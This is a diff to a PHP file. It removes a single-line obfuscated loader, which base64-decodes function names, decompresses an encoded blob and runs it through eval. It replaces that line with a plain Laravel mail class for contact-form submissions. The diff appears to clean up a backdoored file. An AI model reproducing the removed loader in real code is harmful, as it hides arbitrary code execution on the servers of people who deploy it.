@@ -1,1 +1,40 @@
-<?php $_='c1202d7c';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqFVFlz2jAQfu+v4KEzhEkfLI4mTIYHbPBF4hRDJFsvGUsiNiCDU0PA/vVdm8tJmtYzso499O2n3a3VDt/358vXqwcvN4Fg7Vn97vvhIPk9X21e6nffahX9Xq3uoe4bI3jlj3u9eu0iPvnrwbLOY6wIz95amipFrKcjzX3x0G3yuCuMau+dPtdqpREL0tnP9rOY8bUAHJ8gDsZrR4s7Edyec0Nf0ImqclPlU6InbJA6WqiMhOdIayhTZuJNQDqRMDAfr3Du6TqiHpY+sVM6BV04A3ubGXvEiNz6niu9IYoCsj/4M/Q5M55uBuME8eZTOCH7VBCUsFhXKN67gmAE85R6duKTfTKLcT4l3SUl+/xx9wWOZncrTDvyW+4Zj6c7a9bCKT3uC1u4cwH35zxTB6zZUXziKG7czRh2kB+jRJiupEDsDGYWu7l1wB358V6CLWBeh5bWD0sM1bgnu/CpibOA6GngJZIr6I0aOOX5gbvCxjJVuGOf+Fl/SQ1d8acVmXb7Ojqv+6/W0MkoAT4mamQZHSkydUM9J/eJkJYht7zlRix25H3F5oTN0tbh2FQjHusbSJKIr+xoNumHtuECV0NHm5f64Wiu9s/JZNK3gIwrstvjWt0JiC8gDyFd4S3wm7BmO4RMXQB/OXCO/NZ4ffSdnDDMdmdcxVgKI0p4plyXcU/6XUtzl5AX0eNJz1T+wYWN4A2WlumugY8zD1/Hbkth4ozNj/desLze7z6+hRoL0lkIQ76xuToXRKZUC7+IQ82o5yIet0MbsATew+ZXTDPWVNaXfcGDzuwm3vjgy0ZKCrEqgSHz+2mnjJlkYusTJEGWXHD/bSjXvIXnQYwXQgvfc4jT1UUmxGj8ju+PA3AhyIfNkrXEdqQJyYo6NB+2flE3UO9CQzFr2Zt7r1oH/L/4RFMqgRauDu/KP8U6KnL8kEddqJ9u2WdCaFSV5nZpb+V8ddw1ym5ZOWvcnTTLw6t68a//OKu/b3xHP1fVPtdo3P0B1zTJ7w=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Mail;
+
+use Illuminate\Bus\Queueable;
+use Illuminate\Mail\Mailable;
+use Illuminate\Queue\SerializesModels;
+use Illuminate\Contracts\Queue\ShouldQueue;
+
+class ContactFormSubmitted extends Mailable
+{
+    use Queueable, SerializesModels;
+
+    public $data;
+
+    /**
+     * Create a new message instance.
+     *
+     * @param  array  $data
+     * @return void
+     */
+    public function __construct($data)
+    {
+        $this->data = $data;
+    }
+
+    /**
+     * Build the message.
+     *
+     * @return $this
+     */
+    public function build()
+    {
+        return $this->from($this->data['email'], $this->data['name'])
+                    ->subject($this->data['subject'])
+                    ->markdown('emails.contact-form-submitted')
+                    ->with('data', $this->data);
+    }
+}
+
